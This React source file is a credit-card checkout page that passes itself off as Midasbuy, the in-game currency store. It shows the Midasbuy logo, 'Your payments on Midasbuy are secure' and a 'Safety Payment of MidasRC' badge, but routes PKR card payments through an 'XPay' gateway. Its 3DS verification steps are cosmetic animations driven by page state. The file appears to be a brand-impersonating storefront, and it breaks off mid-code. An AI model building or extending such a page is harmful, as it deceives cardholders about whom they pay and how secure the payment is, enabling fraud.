import React, { useState, useEffect, useRef } from 'react';
import { useSearchParams, useNavigate } from 'react-router-dom';
import { CheckCircle, ChevronRight, ChevronDown, Trash2, X, Loader2 } from 'lucide-react';
import shieldIcon from '@/assets/shield-secure-icon.png';
import visaIcon from '@/assets/cards/visa.png';
import mastercardIcon from '@/assets/cards/mastercard.png';
import amexIcon from '@/assets/cards/amex.png';
import unionpayIcon from '@/assets/cards/unionpay.png';
import jcbIcon from '@/assets/cards/jcb.png';
import discoverIcon from '@/assets/cards/discover.png';
import dinersIcon from '@/assets/cards/diners.png';
import pciIcon from '@/assets/pci-icon.png';
import safetyPaymentBadge from '@/assets/safety-payment-badge.png';
import giftBoxIcon from '@/assets/gift-box.png';
import voucherIcon from '@/assets/voucher-icon.png';
import ucProductIcon from '@/assets/uc-product-icon.png';
import cardVerificationGif from '@/assets/card-verification.gif';
import verifiedBadge from '@/assets/verified-badge.png';
import { supabase } from '@/integrations/supabase/client';
import { toast } from 'sonner';
import XPayProvider from '@/components/checkout/XPayProvider';
import XPayCardForm, { XPayCardFormRef } from '@/components/checkout/XPayCardForm';

interface SavedCard {
  id: string;
  card_last_four: string;
  card_type: string;
  expiry_month: string;
  expiry_year: string;
  cardholder_name: string;
  is_default: boolean;
}

interface OrderInfo {
  amount: string;
  pkrAmount?: number; // Original PKR price for payment processing
  currency: string;
  displayCurrency?: string;
  productName: string;
  productType?: string; // Product type for game identification (roblox_robux, freefire_diamonds, etc.)
  productAmount?: string; // Base+bonus amount format (e.g., "10+5")
  playerId: string;
  email: string;
  productImage?: string;
  packageId?: string;
  discountPercentage?: number;
  originalPrice?: number;
  pkrOriginalPrice?: number; // Original price in PKR
  packageIndex?: number; // Index of the package (0-based), first 6 packages (0-5) allow payment
}

// Import exchange rates for currency conversion
import { EXCHANGE_RATES } from '@/utils/exchangeRates';
import { getCurrencySymbol } from '@/utils/urlCurrencyDetector';

// Helper function to format price with currency symbol
const formatCurrencyDisplay = (amount: number | string, currency: string): string => {
  const numAmount = typeof amount === 'string' ? parseFloat(amount) : amount;
  const symbol = getCurrencySymbol(currency);
  
  // High value currencies don't show decimals
  const highValueCurrencies = ['IDR', 'VND', 'KRW', 'JPY', 'CLP', 'COP', 'UZS', 'LBP', 'IRR', 'IQD', 'PKR'];
  const decimals = highValueCurrencies.includes(currency) ? 0 : 2;
  
  const formatted = numAmount.toLocaleString('en-US', {
    minimumFractionDigits: decimals,
    maximumFractionDigits: decimals,
  });
  
  return `${symbol}${formatted}`;
};

// Helper to convert to PKR for payment processing
const convertToPKR = (amount: number | string, fromCurrency: string): number => {
  const numAmount = typeof amount === 'string' ? parseFloat(amount) : amount;
  if (fromCurrency === 'PKR') return numAmount;
  
  const fromRate = EXCHANGE_RATES[fromCurrency] || 1;
  const pkrRate = EXCHANGE_RATES['PKR'] || 278.50;
  
  // Convert to USD first, then to PKR
  const usdAmount = numAmount / fromRate;
  return Math.round(usdAmount * pkrRate);
};

const CreditCardPaymentPage: React.FC = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const [currentStep, setCurrentStep] = useState<1 | 2 | 3 | 4>(1);
  const [orderExpanded, setOrderExpanded] = useState(false);
  const [selectedMethod, setSelectedMethod] = useState<'saved' | 'new'>('new');
  const [saveCard, setSaveCard] = useState(true);
  const [isProcessing, setIsProcessing] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [showCardVerification, setShowCardVerification] = useState(false);
  const [showPaymentVerification, setShowPaymentVerification] = useState(false);
  const [verificationStep, setVerificationStep] = useState(0);
  const [orderInfo, setOrderInfo] = useState<OrderInfo | null>(null);
  const [isLoading, setIsLoading] = useState(true);
  const [userId, setUserId] = useState<string | null>(null);
  
  // XPay state
  const [paymentError, setPaymentError] = useState<string | null>(null);
  const [isCardComplete, setIsCardComplete] = useState(false);
  const xpayFormRef = useRef<XPayCardFormRef>(null);
  
  // Processing popup status: 'processing' | 'success' | 'failed'
  const [processingStatus, setProcessingStatus] = useState<'processing' | 'success' | 'failed'>('processing');
  
  // Failed step tracking for verification bottom sheet (0 = no failure, 1/2/3 = failed at that step)
  const [failedAtStep, setFailedAtStep] = useState<number>(0);

  const verificationTimers = useRef<number[]>([]);
  const clearVerificationTimers = () => {
    verificationTimers.current.forEach((id) => window.clearTimeout(id));
    verificationTimers.current = [];
  };

  useEffect(() => {
    return () => {
      clearVerificationTimers();
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  // Some payment providers block embeds. Lovable preview runs inside an iframe.
  const [isEmbedded, setIsEmbedded] = useState(false);
  useEffect(() => {
    try {
      setIsEmbedded(window.self !== window.top);
    } catch {
      setIsEmbedded(true);
    }
  }, []);
  
  // Saved cards from database
  const [savedCards, setSavedCards] = useState<SavedCard[]>([]);
  const [selectedSavedCardId, setSelectedSavedCardId] = useState<string>('');

  // Get token from URL
  const paramsToken = searchParams.get('paramsToken');

  // Fetch saved cards from database - DISABLED (saved cards feature removed)
  // Cards are no longer saved or shown to users
  const fetchSavedCards = async (_uid: string) => {
    // Saved cards feature has been disabled
    // Always use new card flow
    setCurrentStep(1);
    setSelectedMethod('new');
  };

  useEffect(() => {
    const loadData = async () => {
      try {
        // Load order info
        const savedOrderInfo = localStorage.getItem('credit_card_order_info');
        let parsedOrderInfo = null;
        if (savedOrderInfo) {
          parsedOrderInfo = JSON.parse(savedOrderInfo);
        }
        
        // Check if user is logged in and fetch their saved cards
        const { data: { user } } = await supabase.auth.getUser();
        if (user) {
          setUserId(user.id);
          
          // Fetch user profile to get email
          const { data: profile } = await supabase
            .from('profiles')
            .select('email, phone')
            .eq('user_id', user.id)
            .single();
          
          // Use profile email if available, otherwise use auth email
          const userEmail = profile?.email || user.email || '';
          const userPhone = profile?.phone || '';
          
          // Update order info with user's email from profile
          if (parsedOrderInfo) {
            parsedOrderInfo.email = userEmail;
            parsedOrderInfo.phone = userPhone;
          } else {
            parsedOrderInfo = {
              amount: '0',
              currency: 'PKR',
              productName: 'UC Package',
              playerId: '',
              email: userEmail,
              phone: userPhone
            };
          }
          
          await fetchSavedCards(user.id);
        } else {
          setCurrentStep(1);
          setSelectedMethod('new');
        }
        
        setOrderInfo(parsedOrderInfo);
      } catch (error) {
        console.error('Error loading data:', error);
      }
      setIsLoading(false);
    };

    loadData();
  }, [paramsToken]);

  // Reset error and card state when switching to new card method
  useEffect(() => {
    if (selectedMethod === 'new') {
      setPaymentError(null);
      setIsCardComplete(false);
      setCurrentStep(1);
    }
  }, [selectedMethod]);

  const deleteCard = async (cardId: string) => {
    try {
      const { error } = await supabase
        .from('saved_cards')
        .delete()
        .eq('id', cardId);
      
      if (error) throw error;
      
      setSavedCards(prev => prev.filter(c => c.id !== cardId));
      if (selectedSavedCardId === cardId) {
        const remaining = savedCards.filter(c => c.id !== cardId);
        setSelectedSavedCardId(remaining.length > 0 ? remaining[0].id : '');
        if (remaining.length === 0) {
          setSelectedMethod('new');
          setCurrentStep(1);
        }
      }
      toast.success('Card removed');
    } catch (error) {
      console.error('Error deleting card:', error);
      toast.error('Failed to remove card');
    }
  };

  // Note: handlePayment is now handled internally by XPayCardForm component
  // The form has its own Pay button that triggers payment

  const handleSuccessContinue = () => {
    setShowSuccess(false);
    localStorage.removeItem('credit_card_order_info');
    navigate('/thank-you');
  };

  const maskEmail = (email: string) => {
    if (!email) return '';
    const [localPart, domain] = email.split('@');
    if (!localPart || !domain) return email;
    const maskedLocal = localPart.slice(0, 6) + '***';
    return maskedLocal + '@' + domain;
  };

  if (isLoading) {
    return (
      <div className="min-h-screen bg-[#f4f6f9] flex items-center justify-center">
        <div className="w-8 h-8 border-2 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#f4f6f9] font-sans antialiased text-[#333] pb-10 lg:pb-20">
      
      {/* CARD VERIFICATION MODAL (GIF like your screenshot) */}
      {showCardVerification && (
        <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/60 backdrop-blur-sm p-6">
          <div className="bg-white rounded-xl p-6 max-w-[280px] w-full text-center shadow-2xl animate-in fade-in zoom-in duration-300">
            {processingStatus === 'failed' ? (
              <div className="mb-3">
                <div className="mx-auto w-12 h-12 rounded-full bg-red-50 flex items-center justify-center">
                  <X className="w-7 h-7 text-red-600" />
                </div>
              </div>
            ) : (
              <div className="flex justify-center mb-4">
                <img
                  src={cardVerificationGif}
                  alt="Card Verification"
                  className="w-40 h-auto"
                />
              </div>
            )}

            <h2 className="text-lg font-bold text-gray-900 mb-1">
              {processingStatus === 'failed' ? 'Payment Failed' : 'Processing payment, please wait'}
            </h2>
            <p className="text-sm text-gray-500">
              {processingStatus === 'failed' ? (paymentError || 'Please check your card and try again.') : 'a moment...'}
            </p>
          </div>
        </div>
      )}

      {/* PAYMENT VERIFICATION BOTTOM SHEET */}
      {showPaymentVerification && (
        <>
          <div className="fixed inset-0 z-[99] bg-black/50" />
          <div className="fixed bottom-0 left-0 right-0 z-[100] bg-white rounded-t-2xl shadow-2xl animate-in slide-in-from-bottom duration-300">
            <div className="bg-[#121d33] text-white px-4 py-3 flex items-center justify-between rounded-t-2xl">
              <p className="text-[12px] font-medium leading-snug flex-1 pr-2">
                To ensure the security of your transaction, we will submit a 3ds request to your card provider. Thank you for your patience.
              </p>
              <button 
                onClick={() => setShowPaymentVerification(false)}
                className="p-1"
              >
                <X className="w-5 h-5 opacity-70" />
              </button>
            </div>
            
            <div className="px-8 py-10 space-y-0">
              {/* Step 1 - Card Security Check */}
              <div className="flex items-start gap-4">
                <div className="flex flex-col items-center">
                  {failedAtStep === 1 ? (
                    <div className="w-8 h-8 rounded-full bg-red-500 flex items-center justify-center">
                      <X className="w-5 h-5 text-white" />
                    </div>
                  ) : verificationStep > 1 ? (
                    <img src={verifiedBadge} alt="Verified" className="w-8 h-8 object-contain" />
                  ) : verificationStep === 1 ? (
                    <div className="w-8 h-8 rounded-full border-[3px] border-blue-500 border-t-transparent animate-spin" />
                  ) : (
                    <div className="w-8 h-8 rounded-full border-2 border-gray-300" />
                  )}
                  <div className={`w-0.5 h-16 ${failedAtStep === 1 ? 'bg-red-300' : verificationStep >= 2 ? 'bg-blue-500' : 'bg-gray-200'}`} />
                </div>
                <div className="pt-1.5">
                  <p className={`text-[14px] leading-snug ${failedAtStep === 1 ? 'text-red-600 font-medium' : verificationStep >= 1 ? 'text-gray-900 font-medium' : 'text-gray-400'}`}>
                    {failedAtStep === 1 ? 'Card verification failed' : 'We are checking the security of'}<br />{failedAtStep === 1 ? 'Please try again' : 'your payment'}
                  </p>
                </div>
              </div>
              
              {/* Step 2 - Bank Verification (3DS/OTP) */}
              <div className="flex items-start gap-4">
                <div className="flex flex-col items-center">
                  {failedAtStep === 2 ? (
                    <div className="w-8 h-8 rounded-full bg-red-500 flex items-center justify-center">
                      <X className="w-5 h-5 text-white" />
                    </div>
                  ) : verificationStep > 2 ? (
                    <img src={verifiedBadge} alt="Verified" className="w-8 h-8 object-contain" />
                  ) : verificationStep === 2 ? (
                    <div className="w-8 h-8 rounded-full border-[3px] border-blue-500 border-t-transparent animate-spin" />
                  ) : (
                    <div className="w-8 h-8 rounded-full border-2 border-gray-300" />
                  )}
                  <div className={`w-0.5 h-16 ${failedAtStep === 2 ? 'bg-red-300' : verificationStep >= 3 ? 'bg-blue-500' : 'bg-gray-200'}`} />
                </div>
                <div className="pt-1.5">
                  <p className={`text-[14px] leading-snug ${failedAtStep === 2 ? 'text-red-600 font-medium' : verificationStep >= 2 ? 'text-gray-900 font-medium' : 'text-gray-400'}`}>
                    {failedAtStep === 2 ? 'Bank verification failed' : 'We are requesting verification'}<br />{failedAtStep === 2 ? 'Authentication cancelled' : 'from the bank'}
                  </p>
                </div>
              </div>
              
              {/* Step 3 - Payment Verification */}
              <div className="flex items-start gap-4">
                <div className="flex flex-col items-center">
                  {failedAtStep === 3 ? (
                    <div className="w-8 h-8 rounded-full bg-red-500 flex items-center justify-center">
                      <X className="w-5 h-5 text-white" />
                    </div>
                  ) : verificationStep > 3 ? (
                    <img src={verifiedBadge} alt="Verified" className="w-8 h-8 object-contain" />
                  ) : verificationStep === 3 ? (
                    <div className="w-8 h-8 rounded-full border-[3px] border-blue-500 border-t-transparent animate-spin" />
                  ) : (
                    <div className="w-8 h-8 rounded-full border-2 border-gray-300" />
                  )}
                </div>
                <div className="pt-1.5">
                  <p className={`text-[14px] leading-snug ${failedAtStep === 3 ? 'text-red-600 font-medium' : verificationStep >= 3 ? 'text-gray-900 font-medium' : 'text-gray-400'}`}>
                    {failedAtStep === 3 ? 'Payment verification failed' : 'Please be patient Loading...'}<br />{failedAtStep === 3 ? 'Transaction declined' : 'We are verifying this payment'}
                  </p>
                </div>
              </div>
            </div>
            
            <div className="flex justify-center pb-6">
              <img 
                src={safetyPaymentBadge} 
                alt="Safety Payment of MidasRC" 
                className="h-6 object-contain opacity-60"
              />
            </div>
          </div>
        </>
      )}

      {/* SUCCESS MODAL */}
      {showSuccess && (
        <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/60 backdrop-blur-sm p-6">
          <div className="bg-white rounded-xl p-8 max-w-xs w-full text-center shadow-2xl animate-in fade-in zoom-in duration-300">
            <div className="w-16 h-16 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto mb-4">
              <CheckCircle className="w-8 h-8" />
            </div>
            <h2 className="text-xl font-bold text-gray-900 mb-2">Payment Successful</h2>
            <p className="text-sm text-gray-500 mb-6">Your transaction has been completed successfully.</p>
            <button 
              onClick={handleSuccessContinue}
              className="w-full bg-[#3e82ff] text-white font-bold py-3 rounded-md"
            >
              OK
            </button>
          </div>
        </div>
      )}

      {/* --- HEADER --- */}
      <header className="bg-[#121d33] text-white pt-4 lg:pt-6 pb-10 lg:pb-14 relative overflow-hidden">
        <div className="absolute right-[10px] md:right-[60px] lg:right-[120px] top-[-5px] md:top-0 lg:top-2 opacity-[0.12] pointer-events-none">
          <img 
            src={shieldIcon} 
            alt="" 
            className="w-[130px] h-[130px] md:w-[170px] md:h-[170px] lg:w-[200px] lg:h-[200px] object-contain"
          />
        </div>

        <div className="px-5 lg:px-8 xl:px-16 lg:max-w-6xl lg:mx-auto flex justify-between items-center mb-4 lg:mb-6">
          <div className="flex items-center">
             <img 
               src="/lovable-uploads/b032faed-8af8-43c2-90b8-b20597ef2781.png" 
               alt="Midasbuy Logo" 
               className="h-5 lg:h-7 w-auto"
             />
          </div>
          {orderInfo?.email && (
            <div className="text-[11px] lg:text-[13px] font-medium opacity-80 underline truncate max-w-[130px] lg:max-w-none">
              {maskEmail(orderInfo.email)}
            </div>
          )}
        </div>

        <div className="text-center px-4">
          <h1 
            className="text-[16px] sm:text-[18px] lg:text-[22px] whitespace-nowrap tracking-wide italic" 
            style={{ fontFamily: "'Rajdhani', sans-serif", fontWeight: 600 }}
          >
            Your payments on Midasbuy are secure.
          </h1>
        </div>
      </header>

      {/* --- STEPPER --- */}
      <div className="px-3 lg:px-8 xl:px-16 -mt-5 mb-4 relative z-10 lg:max-w-6xl lg:mx-auto">
        <nav className="bg-white rounded-md shadow-[0_2px_8px_rgba(0,0,0,0.06)] py-3 lg:py-4 px-2 lg:px-8">
          <div className="flex items-center justify-between lg:justify-center lg:gap-4 text-[9px] lg:text-[13px] font-bold text-gray-400">
            <div className={`flex items-center gap-0.5 lg:gap-2 ${currentStep >= 1 ? 'text-blue-500' : ''}`}>
              <span className={`w-4 h-4 lg:w-6 lg:h-6 flex items-center justify-center rounded-full text-[8px] lg:text-[11px] font-bold ${currentStep >= 1 ? 'bg-blue-500 text-white' : 'border border-gray-300 text-gray-400'}`}>1</span>
              <span className="whitespace-nowrap">Shopping</span>
            </div>
            <ChevronRight className="w-2.5 h-2.5 lg:w-4 lg:h-4 opacity-20 flex-shrink-0" />
            <div className={`flex items-center gap-0.5 lg:gap-2 ${currentStep >= 2 ? 'text-blue-500' : ''}`}>
              <span className={`w-4 h-4 lg:w-6 lg:h-6 flex items-center justify-center rounded-full text-[8px] lg:text-[11px] font-bold ${currentStep >= 2 ? 'bg-blue-500 text-white' : 'border border-gray-300 text-gray-400'}`}>2</span>
              <span className="whitespace-nowrap">Review & Pay</span>
            </div>
            <ChevronRight className="w-2.5 h-2.5 lg:w-4 lg:h-4 opacity-20 flex-shrink-0" />
            <div className={`flex items-center gap-0.5 lg:gap-2 ${currentStep >= 3 ? 'text-blue-500' : ''}`}>
              <span className={`w-4 h-4 lg:w-6 lg:h-6 flex items-center justify-center rounded-full text-[8px] lg:text-[11px] font-bold ${currentStep >= 3 ? 'bg-blue-500 text-white' : 'border border-gray-300 text-gray-400'}`}>3</span>
              <span className="whitespace-nowrap">Verification</span>
            </div>
            <ChevronRight className="w-2.5 h-2.5 lg:w-4 lg:h-4 opacity-20 flex-shrink-0" />
            <div className={`flex items-center gap-0.5 lg:gap-2 ${currentStep >= 4 ? 'text-blue-500' : ''}`}>
              <span className={`w-4 h-4 lg:w-6 lg:h-6 flex items-center justify-center rounded-full text-[8px] lg:text-[11px] font-bold ${currentStep >= 4 ? 'bg-blue-500 text-white' : 'border border-gray-300 text-gray-400'}`}>4</span>
              <span className="whitespace-nowrap">Complete</span>
            </div>
          </div>
        </nav>
      </div>

      {/* --- CONTENT AREA --- */}
      <div className="px-3 lg:px-8 xl:px-16 lg:max-w-6xl lg:mx-auto">
        <div className="lg:flex lg:gap-6">
          {/* LEFT COLUMN - Card Info */}
          <div className="lg:flex-1 space-y-3">
            
            {/* ORDER INFO CARD - Mobile Only */}
            <section className="bg-white rounded-md shadow-sm overflow-hidden lg:hidden">
              <div 
                className="px-4 py-3.5 flex justify-between items-center cursor-pointer"
                onClick={() => setOrderExpanded(!orderExpanded)}
              >
                <div className="flex items-center gap-1.5 text-[12px] font-bold text-gray-800">
                  ORDER INFORMATION
                  <ChevronDown className={`w-3 h-3 text-gray-300 transition-transform duration-200 ${orderExpanded ? 'rotate-180' : ''}`} />
                </div>
                <div className="flex items-center gap-2">
                  <span className="text-[15px] font-bold text-[#3e82ff]">
                    {formatCurrencyDisplay(orderInfo?.amount || '0', orderInfo?.currency || 'PKR')}
                  </span>
                  {orderInfo?.discountPercentage && orderInfo.discountPercentage > 0 && orderInfo?.originalPrice ? (
                    <span className="text-[12px] text-gray-400 line-through">
                      {formatCurrencyDisplay(orderInfo.originalPrice, orderInfo?.currency || 'PKR')}
                    </span>
                  ) : null}
                </div>
              </div>
              
              {orderExpanded && (
                <div className="px-4 pb-4 pt-0 animate-in slide-in-from-top-1 duration-200 border-t border-gray-50">
                  <div className="flex items-center justify-between py-3 border-b border-gray-50">
                    <div className="flex items-center gap-3">
                      <div className="w-12 h-12 border border-black rounded-md flex items-center justify-center overflow-hidden bg-transparent">
                        <img src={ucProductIcon} alt="UC Product" className="w-full h-full object-cover" />
                      </div>
                      <span className="text-[13px] font-medium text-gray-800">{orderInfo?.productName || '60 UC'}</span>
                    </div>
                    <span className="text-[13px] font-medium text-gray-700">
                      {formatCurrencyDisplay(orderInfo?.amount || '249', orderInfo?.currency || 'PKR')}
                    </span>
                  </div>
                  
                  <div className="flex items-center justify-between py-3 border-b border-gray-50">
                    <div className="flex items-center gap-3">
                      <div className="w-12 h-12 border border-black rounded-md flex items-center justify-center overflow-hidden bg-transparent">
                        <img src={voucherIcon} alt="Event Voucher" className="w-full h-full object-cover" />
                      </div>
                      <span className="text-[13px] font-medium text-gray-800">Event Voucher (Use in event)</span>
                    </div>
                    <span className="text-[13px] font-medium text-orange-500">FREE</span>
                  </div>
                  
                  <div className="flex items-center justify-between py-3 border-b border-gray-50">
                    <span className="text-[12px] text-gray-500">Subtotal:</span>
                    <span className="text-[13px] font-medium text-gray-700">
                      {formatCurrencyDisplay(orderInfo?.amount || '249', orderInfo?.currency || 'PKR')}
                    </span>
                  </div>
                  
                  <div className="flex items-center justify-between pt-3">
                    <span className="text-[13px] font-bold text-gray-800">Total:</span>
                    <div className="text-right">
                      <span className="text-[15px] font-bold text-gray-800">
                        {formatCurrencyDisplay(orderInfo?.amount || '249', orderInfo?.currency || 'PKR')}
                      </span>
                      {orderInfo?.currency && orderInfo.currency !== 'PKR' && (
                        <div className="text-[11px] text-gray-500 mt-0.5">
                          ≈ {(orderInfo?.pkrAmount || convertToPKR(orderInfo?.amount || '0', orderInfo?.currency || 'PKR')).toLocaleString('en-PK')} PKR
                        </div>
                      )}
                    </div>
                  </div>
                </div>
              )}
            </section>

            {/* CARD INFO CARD */}
            <section className="bg-white rounded-md shadow-sm overflow-hidden mt-3 lg:mt-0">
              <div className="px-4 lg:px-6 py-3 lg:py-4 border-b border-gray-50 bg-gray-50/20">
                <h2 className="text-[12px] lg:text-[14px] font-bold text-gray-800 tracking-tight uppercase">CARD INFO</h2>
              </div>

              {/* Saved Card Option - HIDDEN (Cards are no longer saved/shown) */}

              {/* Add New Card Option - XPay Integration */}
              <div className={`px-4 lg:px-6 py-4 transition-all duration-300 ${selectedMethod === 'new' ? 'bg-blue-50/30' : 'hover:bg-gray-50/50'}`}>
                <div className="flex items-center justify-between mb-3">
                  <div className={`flex items-center gap-3 transition-transform duration-200 ${selectedMethod === 'new' ? 'scale-[1.01]' : ''}`}>
                    <input 
                      type="radio" 
                      name="pay_method" 
                      id="new" 
                      checked={selectedMethod === 'new'} 
                      onChange={() => {
                        setSelectedMethod('new');
                        setCurrentStep(1);
                      }} 
                      className="w-4 h-4 accent-blue-600 cursor-pointer" 
                    />
                    <label htmlFor="new" className={`text-[12px] lg:text-[14px] font-bold cursor-pointer ${selectedMethod === 'new' ? 'text-blue-700' : 'text-gray-800'}`}>
                      Add a new card
                    </label>
                  </div>
                  
                  <div className="flex flex-wrap gap-1.5 items-center">
                    <img src={visaIcon} className="h-4 lg:h-5 object-contain" alt="Visa" />
                    <img src={mastercardIcon} className="h-4 lg:h-5 object-contain" alt="Mastercard" />
                    <img src={amexIcon} className="h-4 lg:h-5 object-contain" alt="Amex" />
                    <img src={unionpayIcon} className="h-4 lg:h-5 object-contain" alt="UnionPay" />
                    <img src={jcbIcon} className="h-4 lg:h-5 object-contain" alt="JCB" />
                    <img src={discoverIcon} className="h-4 lg:h-5 object-contain" alt="Discover" />
                    <img src={dinersIcon} className="h-4 lg:h-5 object-contain" alt="Diners Club" />
                  </div>
                </div>

                {selectedMethod === 'new' && orderInfo && (
                  <div className="space-y-4 animate-in slide-in-from-top-1 duration-300">
                    {/* XPay Card Form - Using XPayProvider pattern */}
                    {/* Payment is always processed in PKR for proper settlement */}
                    <XPayProvider email={orderInfo.email} customerName="Customer">
                      <XPayCardForm
                        ref={xpayFormRef}
                        amount={orderInfo.pkrAmount || convertToPKR(orderInfo.amount, orderInfo.currency || 'PKR')}
                        currency="PKR"
                        originalAmount={parseFloat(orderInfo.amount)}
                        originalCurrency={orderInfo.currency || 'PKR'}
                        customerEmail={orderInfo.email}
                        customerPhone={(orderInfo as any).phone || ''}
                        productName={orderInfo.productName}
                        productType={orderInfo.productType}
                        productAmount={orderInfo.productAmount}
                        playerId={orderInfo.playerId}
                        packageId={orderInfo.packageId}
                        saveCard={saveCard}
                        userId={userId}
                        onCardSaved={() => {
                          // Refresh saved cards after saving
                          if (userId) {
                            fetchSavedCards(userId);
                          }
                        }}
                        onCardComplete={(complete) => {
                          console.log('[CreditCard] Card complete:', complete);
                          setIsCardComplete(complete);
                          // Update step based on card completion
                          if (complete) {
                            setCurrentStep(2);
                          } else {
                            setCurrentStep(1);
                          }
                        }}
                        onSuccess={(details) => {
                          console.log('[XPay] Payment successful:', details);
                          clearVerificationTimers();

                          // Complete all verification steps
                          setVerificationStep(4); // All steps complete
                          setFailedAtStep(0);

                          // Show success after a brief moment
                          setTimeout(() => {
                            setShowCardVerification(false);
                            setShowPaymentVerification(false);
                            setIsProcessing(false);
                            setProcessingStatus('processing');
                            setFailedAtStep(0);

                            setShowSuccess(true);
                            setCurrentStep(4);
                            toast.success('Payment successful!');

                            setTimeout(() => {
                              navigate(`/thank-you?orderId=${details.orderId}`);
                            }, 2000);
                          }, 1000);
                        }}
                        onError={(error) => {
                          console.error('[XPay] Payment failed:', error);
                          clearVerificationTimers();

                          setPaymentError(error);

                          // Determine which step failed based on error type
                          const lowerError = error.toLowerCase();
                          let failStep = 2; // Default to bank verification step
                          
                          if (lowerError.includes('card') || lowerError.includes('invalid') || lowerError.includes('number')) {
                            failStep = 1; // Card check failed
                          } else if (lowerError.includes('3ds') || lowerError.includes('authentication') || lowerError.includes('otp') || lowerError.includes('cancelled')) {
                            failStep = 2; // Bank verification failed
                          } else if (lowerError.includes('declined') || lowerError.includes('insufficient') || lowerError.includes('limit')) {
                            failStep = 3; // Payment verification failed
                          }

                          // If verification sheet is open, show failure there
                          if (showPaymentVerification) {
                            setFailedAtStep(failStep);
                            setIsProcessing(false);
                            
                            // Auto-hide after 3 seconds
                            window.setTimeout(() => {
                              setShowPaymentVerification(false);
                              setFailedAtStep(0);
                              setVerificationStep(0);
                            }, 3000);
                          } else {
                            // Show failed in processing popup
                            setProcessingStatus('failed');
                            setShowCardVerification(true);
                            setIsProcessing(false);

                            // Auto-hide failed popup
                            window.setTimeout(() => {
                              setShowCardVerification(false);
                              setProcessingStatus('processing');
                            }, 2500);
                          }

                          toast.error(error);
                        }}
                      />
                    </XPayProvider>

                    {/* PCI Info Row - Inside card form section */}
                    <div className="pt-3 mt-2 border-t border-gray-100 flex items-center gap-2.5">
                      <img src={pciIcon} alt="PCI" className="h-4 lg:h-5 object-contain" />
                      <p className="text-[9px] lg:text-[11px] text-gray-400 font-medium leading-tight">
                        Your Card Information is secured by PCI DSS compliant systems.
                      </p>
                    </div>
                  </div>
                )}
              </div>
            </section>

            {/* E-MAIL CARD */}
            <section className="bg-white rounded-md shadow-sm p-4 lg:p-6 mt-3">
              <label className="block text-[10px] lg:text-[11px] text-gray-500 font-bold uppercase mb-2">E-mail</label>
              <div className="w-full border border-gray-100 p-3 rounded-sm text-sm text-gray-400 bg-gray-50/10 font-medium">
                {orderInfo?.email ? maskEmail(orderInfo.email) : 'user@example.com'}
              </div>
            </section>

            {/* REWARDS CARD - Mobile only */}
            <section className="bg-white rounded-md shadow-sm p-4 space-y-3.5 mt-3 lg:hidden">
              <div className="flex items-center gap-2.5">
                 <input 
                  type="checkbox" 
                  checked={saveCard} 
                  onChange={(e) => setSaveCard(e.target.checked)} 
                  className="w-4 h-4 rounded-sm accent-blue-600 cursor-pointer" 
                 />
                 <span className="text-[11px] font-bold text-gray-800 tracking-tight">Link your card and enjoy your rewards!</span>
              </div>
              <div className="bg-[#fff7ef] rounded-md p-3 flex items-center gap-3 relative overflow-hidden">
                 <img src={giftBoxIcon} className="w-10 h-10 object-contain animate-[wiggle_1s_ease-in-out_infinite]" alt="Gift" />
                 <div className="flex-1">
                   <p className="text-[10px] text-[#e67e22] font-bold leading-tight">
                     Save a card to get now! Just mark the checkbox below. <span className="underline cursor-pointer">Check details</span>
                   </p>
                 </div>
              </div>
            </section>
          </div>

          {/* RIGHT COLUMN - Order Information (Desktop Only) */}
          <div className="hidden lg:block lg:w-[340px] lg:flex-shrink-0">
            <section className="bg-white rounded-md shadow-sm overflow-hidden sticky top-4">
              <div className="px-6 py-4 border-b border-gray-50 bg-gray-50/20">
                <h2 className="text-[14px] font-bold text-gray-800 tracking-tight uppercase">ORDER INFORMATION</h2>
              </div>
              
              <div className="px-6 py-4">
                <div className="flex items-center justify-between py-4 border-b border-gray-50">
                  <div className="flex items-center gap-4">
                    <div className="w-14 h-14 border border-black rounded-md flex items-center justify-center overflow-hidden bg-transparent">
                      <img src={ucProductIcon} alt="UC Product" className="w-full h-full object-cover" />
                    </div>
                    <span className="text-[14px] font-medium text-gray-800">{orderInfo?.productName || '60 UC'}</span>
                  </div>
                  <span className="text-[14px] font-medium text-gray-700">
                    {formatCurrencyDisplay(orderInfo?.amount || '249', orderInfo?.currency || 'PKR')}
                  </span>
                </div>
                
                <div className="flex items-center justify-between py-4 border-b border-gray-50">
                  <div className="flex items-center gap-4">
                    <div className="w-14 h-14 border border-black rounded-md flex items-center justify-center overflow-hidden bg-transparent">
                      <img src={voucherIcon} alt="Event Voucher" className="w-full h-full object-cover" />
                    </div>
                    <span className="text-[14px] font-medium text-gray-800">Event Voucher (Use in event)</span>
                  </div>
                  <span className="text-[14px] font-medium text-orange-500">FREE</span>
                </div>
                
                <div className="flex items-center justify-between py-4 border-b border-gray-50">
                  <span className="text-[13px] text-gray-500">Subtotal:</span>
                  <span className="text-[14px] font-medium text-gray-700">
                    {formatCurrencyDisplay(orderInfo?.amount || '249', orderInfo?.currency || 'PKR')}
                  </span>
                </div>
                
                <div className="flex items-center justify-between pt-4">
                  <span className="text-[15px] font-bold text-gray-800">Total:</span>
                  <div className="text-right">
                    <span className="text-[18px] font-bold text-[#3e82ff]">
                      {formatCurrencyDisplay(orderInfo?.amount || '249', orderInfo?.currency || 'PKR')}
                    </span>
                    {orderInfo?.currency && orderInfo.currency !== 'PKR' && (
                      <div className="text-[12px] text-gray-500 mt-1">
                        ≈ {(orderInfo?.pkrAmount || convertToPKR(orderInfo?.amount || '0', orderInfo?.currency || 'PKR')).toLocaleString('en-PK')} PKR
                      </div>
                    )}
                  </div>
                </div>
              </div>
            </section>
          </div>
        </div>
      </div>

      {/* --- FOOTER / ACTION AREA --- */}
      {/* Mobile Footer - Normal flow (not fixed) */}
      <div className="px-3 mt-6 lg:hidden">
        <div className="bg-white rounded-md shadow-sm px-4 py-3 flex items-center justify-between">
          <span className="text-[12px] text-gray-500 font-medium underline cursor-pointer truncate max-w-[160px]">
            {orderInfo?.email ? maskEmail(orderInfo.email) : 'user@example.com'}
          </span>
          <button
            onClick={() => {
